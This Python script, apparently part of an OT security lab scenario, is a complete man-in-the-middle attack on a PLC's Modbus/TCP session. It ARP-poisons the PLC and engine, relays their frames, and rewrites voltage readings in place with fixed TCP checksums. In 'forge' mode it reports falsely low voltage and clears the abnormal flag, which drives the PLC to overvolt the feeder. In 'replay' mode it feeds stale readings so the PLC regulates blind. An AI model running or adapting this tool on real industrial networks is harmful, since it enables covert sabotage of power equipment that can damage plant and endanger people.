#!/usr/bin/env python3
"""ot_mitm.py — an adversary in the middle of the PLC's Modbus session.

Run on a host that shares the OT link with the PLC and the engine. It tells each
of the two that the other's address is at this host's MAC (ARP poisoning), then
carries their frames across itself, and rewrites the measurements the engine
sends back before the PLC reads them:

  - forge:  every voltage the PLC reads is ``--report-v`` and the abnormal flag
            is clear. Reported below its regulation band, the PLC raises the DG
            setpoint cycle after cycle and overvolts the feeder itself, with
            writes it is entitled to make.
  - replay: the first ``--window`` readings are recorded untouched, then served
            again in a loop: the PLC regulates on a plant that no longer exists.
  - relay:  nothing is changed. The position alone, for measuring what it costs.

A reading has a fixed length, so it is rewritten in place and only the TCP
checksum changes: sequence numbers stay valid, the PLC's connection survives,
and no new Modbus client appears. The host must not forward the frames itself
(``iptables -P FORWARD DROP``), or each would reach the PLC twice.

With ``--plc-ip auto`` the PLC is whoever on this link polls the engine: the
link floods, so a promiscuous interface hears it without asking anyone.

Every rewritten reading is one JSON line in ``--log``: what the engine said and
what the PLC was given. On exit the two ARP caches are put right.

Copied flat onto the engineering workstation (see the scenario's
guest_files.py). Stdlib only.
"""

import argparse
import fcntl
import json
import signal
import socket
import struct
import sys
import time

import ot_registers as reg

ETH_P_ALL, ETH_P_IP, ETH_P_ARP = 0x0003, 0x0800, 0x0806
PACKET_OUTGOING = 4
SIOCGIFADDR, SIOCGIFNETMASK = 0x8915, 0x891B
SOL_PACKET, PACKET_ADD_MEMBERSHIP, PACKET_MR_PROMISC = 263, 1, 1
ARP_REQUEST, ARP_REPLY = 1, 2
IPPROTO_TCP = 6
MBAP_LEN = 7
VOLTAGES = (reg.IR_V_LOAD, reg.IR_V_DG)
MODES = ("forge", "replay", "relay")


# ── Frames ───────────────────────────────────────────────────────────────────


def mac_bytes(text):
    return bytes.fromhex(text.replace(":", ""))


def arp_frame(op, src_mac, src_ip, dst_mac, dst_ip, eth_dst=None):
    """An Ethernet ARP frame. A request goes to the broadcast address and asks
    for ``dst_ip``; a reply says ``src_ip`` is at ``src_mac``."""
    eth = (eth_dst or dst_mac) + src_mac + struct.pack("!H", ETH_P_ARP)
    arp = struct.pack("!HHBBH", 1, ETH_P_IP, 6, 4, op)
    return eth + arp + src_mac + socket.inet_aton(src_ip) + dst_mac + socket.inet_aton(dst_ip)


def parse_arp(frame):
    """(op, sender_mac, sender_ip) of an ARP frame, or None."""
    if len(frame) < 42 or frame[12:14] != struct.pack("!H", ETH_P_ARP):
        return None
    op = struct.unpack("!H", frame[20:22])[0]
    return op, frame[22:28], socket.inet_ntoa(frame[28:32])


def checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack(f"!{len(data) // 2}H", data))
    while total >> 16:
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def parse_tcp(frame):
    """The TCP segment of an IPv4 frame as a dict of offsets and addresses, or
    None if it is not one."""
    if len(frame) < 34 or frame[12:14] != struct.pack("!H", ETH_P_IP):
        return None
    ihl = (frame[14] & 0x0F) * 4
    if frame[23] != IPPROTO_TCP:
        return None
    tcp = 14 + ihl
    end = 14 + struct.unpack("!H", frame[16:18])[0]
    if len(frame) < tcp + 20:
        return None
    return {
        "src": socket.inet_ntoa(frame[26:30]),
        "dst": socket.inet_ntoa(frame[30:34]),
        "sport": struct.unpack("!H", frame[tcp : tcp + 2])[0],
        "dport": struct.unpack("!H", frame[tcp + 2 : tcp + 4])[0],
        "tcp": tcp,
        "payload": tcp + (frame[tcp + 12] >> 4) * 4,
        "end": end,
    }


def with_payload(frame, seg, payload):
    """``frame`` with its TCP payload replaced by one of the same length, and
    the TCP checksum redone over it."""
    if len(payload) != seg["end"] - seg["payload"]:
        raise ValueError("a rewritten reading must keep its length")
    out = bytearray(frame[: seg["end"]])
    out[seg["payload"] : seg["end"]] = payload
    tcp = seg["tcp"]
    out[tcp + 16 : tcp + 18] = b"\x00\x00"
    segment = bytes(out[tcp : seg["end"]])
    pseudo = bytes(out[26:34]) + struct.pack("!BBH", 0, IPPROTO_TCP, len(segment))
    out[tcp + 16 : tcp + 18] = struct.pack("!H", checksum(pseudo + segment))
    return bytes(out)


# ── Modbus ───────────────────────────────────────────────────────────────────


def read_request(payload):
    """(txn, address, count) of a read-input-registers request, or None."""
    if len(payload) < MBAP_LEN + 5 or payload[MBAP_LEN] != reg.FC_READ_INPUT_REGISTERS:
        return None
    txn = struct.unpack("!H", payload[:2])[0]
    address, count = struct.unpack("!HH", payload[MBAP_LEN + 1 : MBAP_LEN + 5])
    return txn, address, count


def read_response(payload):
    """(txn, [words]) of a read-input-registers response, or None."""
    if len(payload) < MBAP_LEN + 2 or payload[MBAP_LEN] != reg.FC_READ_INPUT_REGISTERS:
        return None
    n = payload[MBAP_LEN + 1]
    if n % 2 or len(payload) < MBAP_LEN + 2 + n:
        return None
    txn = struct.unpack("!H", payload[:2])[0]
    return txn, list(struct.unpack(f"!{n // 2}H", payload[MBAP_LEN + 2 : MBAP_LEN + 2 + n]))


def with_words(payload, words):
    body = struct.pack(f"!{len(words)}H", *words)
    return payload[: MBAP_LEN + 2] + body + payload[MBAP_LEN + 2 + len(body) :]


def named(address, words):
    """{name: engineering value} of the sensor registers in a reading."""
    out = {}
    for i, raw in enumerate(words):
        spec = reg.SENSOR_REGISTERS.get(address + i)
        if spec:
            out[spec[0]] = reg.decode(raw, spec[1])
    return out


class Rewriter:
    """What the PLC is given in place of each reading it asked for."""

    def __init__(self, mode, report_v=0.96, window=10):
        if mode not in MODES:
            raise ValueError(f"unknown mode {mode!r}")
        self.mode, self.report_v, self.window = mode, report_v, window
        self.recorded = {}  # address -> readings kept for the replay
        self.served = 0

    def rewrite(self, address, words):
        """The words to deliver for a reading of ``words`` at ``address``; the
        same list when this reading goes through untouched."""
        if self.mode == "forge":
            out = list(words)
            for i in range(len(words)):
                if address + i in VOLTAGES:
                    out[i] = reg.encode(self.report_v, reg.SENSOR_REGISTERS[address + i][1])
                elif address + i == reg.IR_ABNORMAL:
                    out[i] = 0
            return out
        if self.mode == "replay":
            kept = self.recorded.setdefault(address, [])
            if len(kept) < self.window:
                kept.append(list(words))
                return words
            self.served += 1
            old = kept[(self.served - 1) % len(kept)]
            return old if len(old) == len(words) else words
        return words


# ── The position on the link ─────────────────────────────────────────────────


class Link:
    """This host's raw view of one interface."""

    def __init__(self, iface):
        self.iface = iface
        self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
        self.sock.bind((iface, 0))
        self.mac = self.sock.getsockname()[4]
        packed = struct.pack("256s", iface[:15].encode())
        fd = self.sock.fileno()
        self.ip = socket.inet_ntoa(fcntl.ioctl(fd, SIOCGIFADDR, packed)[20:24])
        self.netmask = socket.inet_ntoa(fcntl.ioctl(fd, SIOCGIFNETMASK, packed)[20:24])

    def on_link(self, ip):
        mask = struct.unpack("!I", socket.inet_aton(self.netmask))[0]
        net = struct.unpack("!I", socket.inet_aton(self.ip))[0] & mask
        return struct.unpack("!I", socket.inet_aton(ip))[0] & mask == net

    def find_client(self, server_ip, port, listen_s=10.0):
        """The address on this link that talks to ``server_ip:port``. A client
        beyond a router shows its own address, not one of this link: skipped."""
        index = socket.if_nametoindex(self.iface)
        promisc = struct.pack("iHH8s", index, PACKET_MR_PROMISC, 0, b"")
        self.sock.setsockopt(SOL_PACKET, PACKET_ADD_MEMBERSHIP, promisc)
        deadline = time.time() + listen_s
        while time.time() < deadline:
            seg = parse_tcp(self.recv(0.2) or b"")
            if seg and seg["dst"] == server_ip and seg["dport"] == port:
                if seg["src"] != self.ip and self.on_link(seg["src"]):
                    return seg["src"]
        raise RuntimeError(f"nobody on {self.iface} talks to {server_ip}:{port}")

    def send(self, frame):
        self.sock.send(frame)

    def recv(self, timeout):
        """One incoming frame, or None on timeout. What this host sends comes
        back on a raw socket too: relaying it again would loop."""
        self.sock.settimeout(timeout)
        try:
            frame, addr = self.sock.recvfrom(65535)
        except (socket.timeout, TimeoutError):
            return None
        return None if addr[2] == PACKET_OUTGOING else frame

    def resolve(self, ip, tries=5):
        """The MAC that answers for ``ip``."""
        broadcast = b"\xff" * 6
        ask = arp_frame(ARP_REQUEST, self.mac, self.ip, b"\x00" * 6, ip, eth_dst=broadcast)
        for _ in range(tries):
            self.send(ask)
            deadline = time.time() + 1.0
            while time.time() < deadline:
                arp = parse_arp(self.recv(0.2) or b"")
                if arp and arp[0] == ARP_REPLY and arp[2] == ip:
                    return arp[1]
        raise RuntimeError(f"{ip} does not answer ARP on {self.iface}")


def log_line(fh, event, **fields):
    fh.write(json.dumps({"t": round(time.time(), 3), "event": event, **fields}) + "\n")
    fh.flush()


def iface_towards(ip, routes="/proc/net/route"):
    """This host's interface on the link that holds ``ip``: the on-link route
    (no gateway) with the longest mask whose network contains it. The kernel
    prints addresses and masks as host-order words of the network bytes."""
    target = struct.unpack("=I", socket.inet_aton(ip))[0]
    best = None
    with open(routes) as f:
        next(f)  # the header
        for line in f:
            cols = line.split()
            iface, dest, gateway, mask = (
                cols[0],
                int(cols[1], 16),
                int(cols[2], 16),
                int(cols[7], 16),
            )
            if gateway == 0 and target & mask == dest and (best is None or mask > best[1]):
                best = (iface, mask)
    if best is None:
        raise RuntimeError(f"no interface of this host is on the link of {ip}")
    return best[0]


def run(args):
    link = Link(args.iface or iface_towards(args.engine_ip))
    if args.plc_ip == "auto":
        args.plc_ip = link.find_client(args.engine_ip, args.port)
    plc_mac, engine_mac = link.resolve(args.plc_ip), link.resolve(args.engine_ip)
    mac_of = {args.plc_ip: plc_mac, args.engine_ip: engine_mac}
    rewriter = Rewriter(args.mode, args.report_v, args.window)
    asked = {}  # txn -> (address, count) the PLC asked for
    stop = {"now": False}
    signal.signal(signal.SIGTERM, lambda *_: stop.update(now=True))
    signal.signal(signal.SIGINT, lambda *_: stop.update(now=True))

    def tell(claim_mac):
        """Tell each victim where the other is: here, or (to undo) where it is."""
        link.send(
            arp_frame(ARP_REPLY, claim_mac or engine_mac, args.engine_ip, plc_mac, args.plc_ip)
        )
        link.send(
            arp_frame(ARP_REPLY, claim_mac or plc_mac, args.plc_ip, engine_mac, args.engine_ip)
        )

    with open(args.log, "a") as fh:
        log_line(fh, "start", mode=args.mode, plc_ip=args.plc_ip, report_v=args.report_v)
        end = time.time() + args.duration if args.duration else None
        next_tell, relayed, rewritten = 0.0, 0, 0
        try:
            while not stop["now"] and (end is None or time.time() < end):
                if time.time() >= next_tell:
                    tell(link.mac)
                    next_tell = time.time() + args.refresh
                frame = link.recv(0.2)
                if frame is None or frame[:6] != link.mac:
                    continue
                seg = parse_tcp(frame)
                if seg is None or seg["dst"] not in mac_of or seg["src"] not in mac_of:
                    continue
                payload = frame[seg["payload"] : seg["end"]]
                if seg["src"] == args.plc_ip and seg["dport"] == args.port:
                    request = read_request(payload)
                    if request:
                        asked[request[0]] = request[1:]
                elif seg["src"] == args.engine_ip and seg["sport"] == args.port:
                    response = read_response(payload)
                    address = asked.pop(response[0], (None,))[0] if response else None
                    if address is not None:
                        words = rewriter.rewrite(address, response[1])
                        if words != response[1]:
                            frame = with_payload(frame, seg, with_words(payload, words))
                            rewritten += 1
                            log_line(
                                fh,
                                "rewritten",
                                txn=response[0],
                                true=named(address, response[1]),
                                sent=named(address, words),
                            )
                link.send(mac_of[seg["dst"]] + link.mac + frame[12:])
                relayed += 1
                if relayed == 1:
                    log_line(fh, "in_the_middle")
        finally:
            for _ in range(3):
                tell(None)
                time.sleep(0.2)
            log_line(fh, "stop", relayed=relayed, rewritten=rewritten)
    return 0 if relayed else 1


def main():
    ap = argparse.ArgumentParser(description="Adversary in the middle of the PLC's Modbus session")
    ap.add_argument(
        "--iface",
        default=None,
        help="this host's interface on the OT link (default: the one the engine is reached on)",
    )
    ap.add_argument("--plc-ip", default="auto", help="the PLC, or 'auto' to find it by listening")
    ap.add_argument("--engine-ip", required=True)
    ap.add_argument("--port", type=int, default=reg.MODBUS_PORT)
    ap.add_argument("--mode", choices=MODES, default="forge")
    ap.add_argument(
        "--report-v",
        type=float,
        default=0.96,
        help="forge: the voltage (pu) the PLC is told, below its regulation band",
    )
    ap.add_argument("--window", type=int, default=10, help="replay: readings recorded first")
    ap.add_argument("--refresh", type=float, default=1.0, help="seconds between ARP refreshes")
    ap.add_argument("--duration", type=float, default=0.0, help="seconds to run (0: until killed)")
    ap.add_argument("--log", default="/ot_mitm.jsonl")
    return run(ap.parse_args())


if __name__ == "__main__":
    sys.exit(main())
